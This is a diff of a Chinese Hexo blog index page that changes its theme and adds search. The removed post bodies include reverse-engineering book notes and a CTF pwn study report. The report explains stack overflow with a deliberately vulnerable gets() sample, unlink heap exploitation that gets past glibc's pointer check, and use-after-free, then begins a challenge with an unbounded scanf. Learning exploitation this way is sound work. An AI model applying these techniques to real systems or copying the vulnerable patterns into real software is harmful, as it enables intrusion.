@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next muse use-motion" lang="zh-Hans">
+<html class="theme-next gemini use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -93,7 +93,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Gemini',
     version: '5.1.4',
     sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
@@ -228,9 +228,41 @@
       
 
       
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
     </ul>
   
 
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
   
 </nav>
 
@@ -350,11 +382,19 @@
       
 
       
+      
+        
         
           
-            <h1 id="写于20190422"><a href="#写于20190422" class="headerlink" title="写于20190422"></a>写于20190422</h1><p>终于，在想了很久之后，把博客搭起来了。<br>虽然搭建的时候没添加一些花里胡哨的东西，但还是折腾了一两个小时。<br>以前没写过多少东西，索性不论质量先把文章都扔上来吧。<br>今天看了<a href="https://blog.csdn.net/whklhhhh" target="_blank" rel="noopener">奈沙夜影师傅的CSDN博客</a>，觉得像夜影师傅这样每天都坚持记下一点心得发布文章，对我来说还是有点难了。<br>目前还没想好怎么维护这个小小的博客，先走一步看一步了。<br>目前最要紧的事情大概是要复习操作系统/数据库/面向对象了，虽然Python第一个考试，但是考查课没什么需要慌的。<br>还是觉得Python课比较水，不知道考试会不会考Django + vue那些东西……</p>
-
-          
+          写于20190422终于，在想了很久之后，把博客搭起来了。虽然搭建的时候没添加一些花里胡哨的东西，但还是折腾了一两个小时。以前没写过多少东西，索性不论质量先把文章都扔上来吧。今天看了奈沙夜影师傅的CSDN博客，觉得像夜影师傅这样每天都坚持记下一点心得发布文章，对我来说还是有点难了。目前还没想好怎么维
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/22/20190422/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -492,47 +532,22 @@
       
 
       
+      
+        
         
           
-            <h1 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello, world!"></a>Hello, world!</h1><blockquote>
-<p>本章以经典的hello world程序解释了在x86、x86-64、ARM、MIPS不同架构下不同编译环境产生的结果的差异</p>
-</blockquote>
-<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h4 id="MSVC2010"><a href="#MSVC2010" class="headerlink" title="MSVC2010"></a>MSVC2010</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_main proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">    <span class="keyword">push</span> offset $sg3830     <span class="comment">;对应字符串存储地址，笔记中没有记述全部的代码</span></span><br><span class="line">    <span class="keyword">call</span> _printf</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">4</span>              <span class="comment">;将栈指针移出，4对应32位字节数</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure>
-<p>汇编语言存在两种语体，Intel以及AT&amp;T，上述汇编语言为Intel语体</p>
-<h4 id="GCC-4-4-1"><a href="#GCC-4-4-1" class="headerlink" title="GCC 4.4.1"></a>GCC 4.4.1</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main    proc <span class="built_in">near</span></span><br><span class="line">var_10  = <span class="built_in">dword</span> <span class="built_in">ptr</span> - <span class="number">10h</span></span><br><span class="line">        <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="number">0fffffff0h</span>     <span class="comment">;使esp 16字节对齐</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, offset aHelloWorld        <span class="comment">;"Hello world\n"</span></span><br><span class="line">        <span class="comment">;先用eax存储字符串的地址</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">esp</span> + <span class="number">10h</span> + var_10], <span class="built_in">eax</span>   </span><br><span class="line">        <span class="keyword">call</span> _printf</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span>      <span class="comment">;没有优化</span></span><br><span class="line">        <span class="keyword">leave</span></span><br><span class="line">        <span class="keyword">retn</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure>
-<h4 id="GCC-4-7-3-AT-amp-T（常见于UNIX）"><a href="#GCC-4-7-3-AT-amp-T（常见于UNIX）" class="headerlink" title="GCC 4.7.3: AT&amp;T（常见于UNIX）"></a>GCC 4.7.3: AT&amp;T（常见于UNIX）</h4><p>小数点开头的指令为宏，可读性差，忽略宏之后代码如下:</p>
-<p>(markdown不支持AT&amp;T语体代码高亮)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.lc0:</span><br><span class="line">        .string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">        pushl %ebp</span><br><span class="line">        movl %esp, %ebp</span><br><span class="line">        andl $-16, %esp</span><br><span class="line">        subl $16, %esp</span><br><span class="line">        movl $.lc0, (%esp)</span><br><span class="line">        call printf</span><br><span class="line">        movl $0, %eax</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure></p>
-<p>Intel与AT&amp;T区别：</p>
-<ul>
-<li>运算表达式书写顺序相反</li>
-<li>AT&amp;T中在寄存器前加%，在立即数前加$，使用圆括号（Intel使用方括号）</li>
-<li>AT&amp;T运算操作符需要声明操作数类型</li>
-<li><ol>
-<li>-q quad(64位)</li>
-</ol>
-</li>
-<li><ol start="2">
-<li>-l 32位long</li>
-</ol>
-</li>
-<li><ol start="3">
-<li>-w 16位word</li>
-</ol>
-</li>
-<li><ol start="4">
-<li>-b 8位byte</li>
-</ol>
-</li>
-<li>……</li>
-</ul>
-<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><h4 id="MSVC-2012-x64"><a href="#MSVC-2012-x64" class="headerlink" title="MSVC 2012 x64"></a>MSVC 2012 x64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main    proc</span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">rcx</span>, offset flat:$sg2989</span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure>
-<p>64位寄存器在32位基础上扩展，仍可用e开头正常使用32位寄存器</p>
-<h4 id="GCC-4-4-6-X64"><a href="#GCC-4-4-6-X64" class="headerlink" title="GCC 4.4.6 X64"></a>GCC 4.4.6 X64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.string</span> <span class="string">"Hello world\n"</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, offset flat:.lc0   <span class="comment">;"hello world"</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
-<p>前六个参数保存在寄存器中；对E寄存器使用mov写入时，对应的R寄存器高32位会被置0</p>
-<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h4 id="Keli-6-2013-ARM模式"><a href="#Keli-6-2013-ARM模式" class="headerlink" title="Keli 6/2013 ARM模式"></a>Keli 6/2013 ARM模式</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main</span></span><br><span class="line">        <span class="keyword">stmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">lr</span>&#125;     <span class="comment">;相当于push，把r4和lr(link register)的值放到数据栈中</span></span><br><span class="line">        <span class="keyword">adr </span><span class="built_in">r0</span>, aHelloWorld     <span class="comment">;将字符串偏移与pc相加，结果存储到r0</span></span><br><span class="line">        <span class="keyword">bl </span>__2printf    <span class="comment">;将下一条指令地址存入lr，将printf()地址写入pc</span></span><br><span class="line">        <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">ldmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">pc</span>&#125;     <span class="comment">;与stmfd相反，类似popj</span></span><br></pre></td></tr></table></figure>
-<p>ARM的sp寄存器相当于x86架构下的sp/esp/rsp的集合<br><br>ARM的pc相当于x86的ip/eip/rip</p>
+          Hello, world!
+本章以经典的hello world程序解释了在x86、x86-64、ARM、MIPS不同架构下不同编译环境产生的结果的差异
 
-          
+x86MSVC201012345678910_main proc    push ebp    mov ebp, esp    push offs
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/22/逆向工程权威指南读书笔记-3/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -670,18 +685,24 @@
       
 
       
+      
+        
         
           
-            <h1 id="最简函数"><a href="#最简函数" class="headerlink" title="最简函数"></a>最简函数</h1><blockquote>
-<p>本章以一个函数<code>int f(){return 123;}</code>在不同指令集下的编译结果，简单描述了指令集间的差异。</p>
-</blockquote>
-<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">f:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">123</span></span><br><span class="line">    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
-<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f <span class="meta">proc</span></span><br><span class="line">    <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0x7b</span> <span class="comment">; 123</span></span><br><span class="line">    <span class="keyword">bx </span><span class="built_in">lr</span></span><br><span class="line">    <span class="meta">endp</span></span><br></pre></td></tr></table></figure>
-<p>ARM中，r0保存函数返回值，lr保存返回地址（区别于x86的函数栈），bx为跳转指令。</p>
-<h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>$<span class="number">31</span></span><br><span class="line">li $<span class="number">2</span>, <span class="number">123</span>     <span class="comment"># 0x7b</span></span><br></pre></td></tr></table></figure>
-<p>j为跳转，$31、$2表示寄存器，根据RISC的特性，赋值语句在转移指令之前执行，因此顺序颠倒。</p>
+          最简函数
+本章以一个函数int f(){return 123;}在不同指令集下的编译结果，简单描述了指令集间的差异。
 
-          
+x86123f:    mov eax, 123    ret
+ARM1234f proc    mov r0, #0x7b ; 123    bx lr    endp
+ARM中
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/22/逆向工程权威指南读书笔记-2/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -819,27 +840,28 @@
       
 
       
+      
+        
         
           
-            <h1 id="CPU简介"><a href="#CPU简介" class="headerlink" title="CPU简介"></a>CPU简介</h1><blockquote>
-<p>一些基本概念：指令码、机器码、汇编语言、寄存器</p>
-</blockquote>
-<p>本书使用的CPU架构：</p>
-<ul>
-<li>x86</li>
-<li>x86-64</li>
-<li>ARM64</li>
-<li>ARM(属于RISC CPU)<blockquote>
-<p>Thumb模式(指令为2字节大小)节省了传统ARM统一指令码长度为4字节的情况下占用空间较大的问题。需要注意Thumb不能封装所有ARM指令，传统ARM的4字节模式可以和Thumb模式同时存在</p>
-<blockquote>
-<p>Thumb-2模式包含了2字节指令和4字节指令，但不是简单的Thumb与ARM的复合，而是一种独立运行模式，应用于iPod、iPhone、iPad应用程序，Xcode编译器默认使用此模式编译</p>
-</blockquote>
-</blockquote>
-</li>
-</ul>
-<p><b>ARM指令集分三类，ARM、ARM64、Thumb(Thumb-2)</b></p>
+          CPU简介
+一些基本概念：指令码、机器码、汇编语言、寄存器
 
-          
+本书使用的CPU架构：
+
+x86
+x86-64
+ARM64
+ARM(属于RISC CPU)
+Thumb模式(指令为2字节大小)节省了传统ARM统一指令码长度为4字节的情况下占用空间较大的问题。需要注意Thumb不能封装所有ARM指令，传统
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/22/逆向工程权威指南读书笔记-1/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -977,82 +999,23 @@
       
 
       
+      
+        
         
           
-            <h1 id="寒假任务提交"><a href="#寒假任务提交" class="headerlink" title="寒假任务提交"></a>寒假任务提交</h1><blockquote>
-<p>因为之前已经有一定基础，所以假期的学习重点放在了补充基础知识上，顺便针对性地做了几道有代表性的题，每道题的知识点是很单一的栈溢出/格式化字符串/堆溢出，但是也不算简单到秒杀级别，因为会夹杂一些坑，并且出题人挖的坑一个不剩的全踩到了……</p>
-</blockquote>
-<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h3><blockquote>
-<p>这部分主要是放一些基础的做题前置知识，以前学过的和新掌握的都放在一起了。</p>
-</blockquote>
-<h5 id="1-汇编、栈溢出"><a href="#1-汇编、栈溢出" class="headerlink" title="1.汇编、栈溢出"></a>1.汇编、栈溢出</h5><p>常见寄存器如图</p>
-<p><img src="http://www.cs.virginia.edu/~evans/cs216/guides/x86-registers.png" alt="Please wait while loading image." title="x86"></p>
-<p>其中重点在于ESP、EBP。esp用于保存栈顶指针，ebp保存栈底（主要和栈帧联系在一起）。<br>下面谈一个栈溢出的前置知识：栈帧</p>
-<ul>
-<li>栈帧实际上就是函数调用的记录。CPU没有多余的寄存器保存多个函数的返回地址，而一旦出现2个以上函数的嵌套调用，外部函数的返回地址以及局部变量等数据就需要临时保存，保存的方法就需要用到栈帧实现。</li>
-<li>栈帧存储在栈上，其本身也按栈结构进行存储。栈帧一块块地存储在栈上，就导致寄存器的ebp不断改变，因此ebp也需要在函数调用的时候压入栈帧保存。栈帧的实际结构如下：</li>
-</ul>
-<p><img src="https://upload-images.jianshu.io/upload_images/5418798-1c45c860220f0dfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374" alt="Please wait while loading image." title="栈帧"></p>
-<ul>
-<li>在生成栈帧时，先将返回地址压入栈中，再压入ebp。设想，程序设计者开辟了一个数组用于保存用户输入，运行时这个数组对应的空间位于图中ebp的上部，此时，若程序未对用户输入做长度鉴定，用户此时输入了一个大于数组大小的字符串，系统不会自动为输入做出检查，只会按事先写好的步骤，将字符串一点点存入栈中，多出来的部分同样会被存入，而预留的空间已经不足，这种情况下溢出就发生了。多余的字符串会按顺序覆盖掉栈上的ebp、返回地址，导致返回地址异常，从而使程序崩溃。</li>
-</ul>
-<h5 id="2-工具"><a href="#2-工具" class="headerlink" title="2.工具"></a>2.工具</h5><p>做pwn题不太强调逆向能力，一般只需要使用IDA反汇编，大致阅读，或者干脆F5反编译直接阅读C代码，理清代码的大致思路即可。在一些题目中，出题者会实现写好获取flag的函数，但并不在main中使用，此时还需要在IDA中查看左侧函数表，观察是否有这类和shell直接相关的未调用函数（也可使用r2的aa功能）。<br>为了查看程序所开启的保护，可使用checksec（随pwnlib安装）来查看。<br>为了写exp，python的pwn库基本是必不可少的（其实直接用C程序写exp更直接，也并不麻烦，只是pwn用的人越来越多，集成的功能也越来越多，基本没有人用C写了）。pwn中最基础的操作，如recv()、process()、interactive()、p32()、sendline()等等，只需简单使用一遍就可以上手，pwn的其他的功能则需要多看官方说明（如直接生成shellcode等等）。</p>
-<h5 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a>3.堆</h5><p>由于堆的内容很多，我也只是研究了一部分，没办法写一个总结，就先把学习的视频链接贴上来了……原视频是在YouTube上的，为了不用每次特意挂梯子去看视频，我把视频搬运到B站了。<a href="https://www.bilibili.com/video/av43948832/" target="_blank" rel="noopener">链接</a></p>
-<h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><blockquote>
-<p>主要是栈溢出，格式化字符串的原理比较简单，月刊里写得很详细了。</p>
-</blockquote>
-<h5 id="1-栈溢出"><a href="#1-栈溢出" class="headerlink" title="1.栈溢出"></a>1.栈溢出</h5><p>结合栈帧的知识，栈溢出实际上就是构造一个输入，使输入的内容恰好覆盖到ebp下面的返回地址上，这样当函数返回时就会按攻击者输入的地址返回，返回地址会被存储到eip中，也就是程序将要执行的下一条指令。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5418798-738c7fdf09073b61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/946" alt="Please wait while loading image." title="stack overflow"></p>
-<p>例：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>C语言课上老师提到过gets()函数并不好，不推荐使用，因为gets()不会对输入做出长度检测，因此很容易导致栈溢出。上面的代码由于在vulnerable()中使用了gets()，因此攻击者可以通过构造一个字符串，将它的返回地址覆盖为success()的首地址，这样在vulnerable()返回后会在屏幕上输出”You already controlled it.”现代操作系统已经实现了多种缓解栈溢出攻击的方法，如canary保护、NX保护、ASLR等机制，上述代码也只有在编译器关闭了众多保护机制的前提下才能实现简单的栈溢出攻击，否则需要各种机制的应对措施来绕过机制，使得栈溢出的利用受限。<br>假期还大致学习了NX、ASLR的绕过，参考的<a href="https://sploitfun.wordpress.com/" target="_blank" rel="noopener">SploitFun</a><br>关于栈溢出的介绍内容补充见i春秋月刊</p>
-<h5 id="2-堆溢出"><a href="#2-堆溢出" class="headerlink" title="2.堆溢出"></a>2.堆溢出</h5><p>堆溢出的原理和栈溢出相同，但由于堆的chunk结构复杂，并且一般在堆中没有返回地址，因此堆溢出之后的利用也相对复杂。大致思路（以unlink溢出为例），是仿照chunk的格式，计算偏移，在chunk的data后面再手动写上一个prev_size、chunk_size以及fd、bk指针，以此达到伪造一个堆块的效果，随后写入的shellcode会覆盖掉free()的GOT地址。之后，若程序要调用free()，就会实际上执行shellcode，实现攻击者的目的。</p>
-<ul>
-<li>unlink</li>
-</ul>
-<p>假设堆上有若干个chunk：chunk0、chunk1、chunk2、chunk3<br>四个chunk都正在使用，这时我们正常free掉chunk2<br>之后chunk2的size后面多了fd、bk，并且chunk2指针存入bin中<br>假设chunk1可以溢出，那么就可以通过chunk1溢出到chunk2，修改chunk2的fd、bk<br>把fd修改为[目标地址-12]，bk修改为目标值（任意地址写的地址，和写进去的值）</p>
-<p>再free掉chunk1，因为chunk1的bk指向chunk2，fd指向chunk0，而只有chunk2是freed chunk<br>所以触发了unlink机制，unlink机制要对<strong>chunk2</strong>进行操作，以合并chunk1和chunk2</p>
-<p>这里FD、BK指的是<strong>被unlink的</strong>chunk的fd、bk指向的chunk<br>此时unlink认为chunk2的FD为[目标地址-12]<br>同理，unlink认为chunk2的BK为目标值</p>
-<p>确认了FD和BK，unlink将会进行双向链表的节点删除处理<br>unlink会执行 ：</p>
-<ol>
-<li>FD-&gt;bk = BK，unlink为了确定bk，需要通过chunk2的指针来计算（计算方法为FD加上3倍的size字段大小，32位下为12），而FD=[目标地址-12]所以FD-&gt;bk就相当于目标地址，unlink要把BK赋值给目标地址，此时，目标值就复制到了目标地址</li>
-<li>BK-&gt;fd = FD，同理，BK-&gt;fd需要加2倍的字段大小，32位下是8，因此unlink将[目标地址-12]复制到了[目标值+8]，貌似没什么用，前一步已经完成了这个操作。</li>
-</ol>
-<p>现代glibc为了应对上述情况的发生，在unlink前加了一个检测步骤，即检测P-&gt;fd-&gt;bk是否指向P，P-&gt;bk-&gt;fd是否指向P（P为chunk2）<br>把前面构造的fake chunk带入这个检测，FD-&gt;bk指向的是目标地址，不是P，不能通过检测<br>因此为了应对检测，需要改变改写的fake chunk的fd和bk</p>
-<p>详细解释下unlink后的操作：</p>
-<p>（P_ptr是需要事先获取的）<br>在这里将chunk2的fd设置成chunk2指针减去12（FD = P_ptr - 12），fd设置成chunk2指针减去8（BK = P_ptr - 8）<br>这里的FD、BK是unlink认为的，不是正常理解下的chunk1和chunk3</p>
-<p>这样设置之后，unlink前的指针检查就会变为如下：<br>unlink计算FD-&gt;bk时，会使用FD，把FD加上12，而伪造的FD实际上是P_ptr - 12，计算后得到P_ptr，也就是指向chunk2的指针<br>同理BK-&gt;fd经过计算也会得到指向chunk2的指针<br>这样伪造的fd bk就通过了unlink前的检查，chunk2将会被unlink，合并到chunk1</p>
-<p>按之前提到过的unlink的执行步骤进行：</p>
-<ol>
-<li>FD-&gt;bk = BK，刚刚提过，FD-&gt;bk就是chunk2，这个指针存储在bin list中，执行后，指针变为P_ptr - 8</li>
-<li>BK-&gt;fd = FD，这里BK-&gt;fd依然是chunk2，执行后，指针变为P_ptr - 12<br>可以看出，这里的第一步结果被第二部的结果覆盖掉，unlink后的实际结果，仅相当于执行了第二步<br>最终bin list中指向chunk2的指针指向了chunk2 - 12的地址处，这个指针一般存在于BSS段，<br>因此可以通过修改指针对任意地址读写。</li>
-</ol>
-<ul>
-<li>UAF</li>
-</ul>
-<p>UAF，即free后使用，free后未将指针置为NULL，造成悬空（也就是野指针），之后想办法将这块内存再次获取回来，写入值，此时的新指针和野指针同时指向这块内存，也就可以利用野指针来操作这块内存的数据，造成任意读写。<br>举个栗子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> stu_id</span><br><span class="line">    <span class="keyword">char</span>* stu_name;</span><br><span class="line">    <span class="keyword">int</span> *()(<span class="keyword">void</span>);</span><br><span class="line">&#125;stu;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></p>
-<p>假设有符合上述结构体的元素stu0，程序此时要free掉stu0，但是忘记将stu0的指针置空，现在我们有一个stu0的指针了。我们需要想办法再次使用stu0这块内存，最简单的办法就是再通过程序申请一个同样大小的块，此时堆管理器会按照管理机制将刚刚释放掉的stu0再度利用，由此我们得到第二个指向stu0的指针，我们控制这个新指针正常对stu_id和stu_name进行赋值，假设stu_name值为AAAA(0x41414141)，打印野指针的stu_name，就会将stu_name的值解引用打印出0x41414141地址处的值，同理如果是通过野指针调用结构体内部函数，会将该地址解引用劫持控制流到任意地址。</p>
-<h3 id="三、pwn题"><a href="#三、pwn题" class="headerlink" title="三、pwn题"></a>三、pwn题</h3><h5 id="1-magic"><a href="#1-magic" class="headerlink" title="1.magic"></a>1.<a href="https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/1" target="_blank" rel="noopener">magic</a></h5><p><a href="https://bamboofox.cs.nctu.edu.tw/uploads/challenge/attachments/1/magic" target="_blank" rel="noopener">题目下载</a></p>
-<p>题目线索给出了两个关键函数源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">    do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>通过在虚拟机下运行程序，得到如下结果：</p>
